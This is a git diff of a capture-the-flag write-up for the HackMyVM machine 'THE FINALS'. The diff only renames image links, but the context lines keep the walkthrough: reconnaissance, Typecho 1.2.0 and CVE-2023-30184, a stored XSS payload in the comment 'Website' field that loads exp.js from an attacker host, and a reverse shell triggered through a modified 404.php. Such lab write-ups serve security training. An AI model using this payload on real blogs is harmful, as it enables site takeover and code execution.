@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 
 Accessing the web server on port 80 revealed a themed landing page:
 
-![](machines/Thefinals/image.png)
+![](images/img.png)
 
 The page displayed "THE FINALS" game arenas with various locations (Monaco, Seoul, Skyway Stadium, Las Vegas, SYS$HORIZON, Kyoto, Fortune Stadium, Bernal). At the bottom of the page, a domain name was discovered: **THEFINALS.hmv**
 
@@ -142,13 +142,13 @@ The most interesting discovery was the **/blog/** directory, indicating a blog a
 
 Navigating to `http://thefinals.hmv/blog/` revealed a blog titled "THE FINALS Update Tracker" with the tagline "Only for professional players":
 
-![](image-1.png)
+![](images/img-1.png)
 
 The blog contained posts including "We'd like hearing your voice" with a notable message: "*Never hackers like CNS*" - foreshadowing for later stages. There was also a post titled "SEASON 6: RISING STARS" discussing game content updates.
 
 Examining the page source code revealed critical version information:
 
-![](image-3.png)
+![](images/img-3.png)
 
 The HTML meta tag showed:
 ```html
@@ -161,7 +161,7 @@ The HTML meta tag showed:
 
 The blog also exposed an administrative login page at `http://thefinals.hmv/blog/admin/`:
 
-![](image-2.png)
+![](images/img-2.png)
 
 Research into Typecho 1.2.0 vulnerabilities led to the discovery of **CVE-2023-30184**, a Stored Cross-Site Scripting (XSS) to Remote Code Execution vulnerability.
 
@@ -252,7 +252,7 @@ Next, navigating to `http://thefinals.hmv/blog/index.php/archives/1/` (the blog 
 http://x.x.com/"></a><script/src="http://192.168.100.1:8080/exp.js"></script><a/href="#
 ```
 
-![](image-4.png)
+![](images/img-4.png)
 
 The payload was entered in the "Website" field, with minimal content ("X") in the comment body. When submitted:
 
@@ -278,7 +278,7 @@ To trigger the reverse shell, the modified `404.php` file was accessed directly:
 http://thefinals.hmv/blog/usr/themes/default/404.php
 ```
 
-![](image-5.png)
+![](images/img-5.png)
 
 The browser displayed a blank white page (expected behavior as the PHP executes the shell), and the listener received a connection:
 
